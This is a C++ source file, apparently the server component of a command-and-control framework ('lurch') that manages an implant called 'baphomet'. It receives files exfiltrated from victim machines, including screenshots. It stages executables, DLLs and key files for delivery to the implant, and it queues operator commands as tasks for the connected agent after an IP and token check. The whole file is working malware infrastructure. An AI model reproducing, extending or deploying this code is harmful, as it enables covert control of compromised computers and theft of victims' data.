//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>
#include <components.hpp>

lurch::result<std::filesystem::path>
lurch::baphomet::upload(const std::string &file, const std::string &extension) {

    //
    // if the file is prefixed with the "exfil stub" complete the top task.
    //

    if(file.starts_with("!!BAPHOMET_EXFIL!!")) {
        if(tasks.empty()) {
            return error("file sent, but one was not expected.");
        }

        //
        // Edge case here.
        // If the result is for a screenshot, the file extension should be .bmp,
        // but it will arrive as .tmp because it's stored as a temporary file on the victim machine.
        //
        std::string ext = extension;
        if(tasks.back() == (std::string("screenshot") + AGENT_DELIMITING_CHAR)) {
            ext = "bmp";
        }

        tasks.pop();
        return inst->db.fileman_create(
            std::string_view(file.data() + 18, file.size() - 18),
            ext,
            id,
            true
        );
    }


    //
    // Otherwise, just stage the file. Only these file types are accepted.
    //

    if( extension != "dll"  &&
        extension != "exe"  &&
        extension != "bin"  &&
        extension != "o"    &&
        extension != "obj"  &&
        extension != "crt"  &&
        extension != "key"
        ) {
        return error("invalid file type for this object.");
    }

    return inst->db.fileman_create(file, extension, id, true);
}


lurch::result<std::string>
lurch::baphomet::receive(reciever_context& ctx) {

    if(!commands.ready()) {
        init_commands();
    }

    if(!commands.matches(ctx.cmd)) {
        if(ctx.address == connected_agent_data.ip && ctx.tok.token == connected_agent_data.token) {
            return complete_task(ctx);
        }

        return error("invalid command or argument");
    }

    if(callables.contains(ctx.cmd.name)) {
        return callables[ctx.cmd.name](this, ctx);
    }


    //
    // For commands with no arguments, simply push the name of the command.
    //

    if(ctx.cmd.arguments.empty()) {
        tasks.push(ctx.cmd.name + AGENT_DELIMITING_CHAR);
        return {"successfully pushed task " + ctx.cmd.name};
    }

    return OBJECT_EMPTY_RESPONSE;
}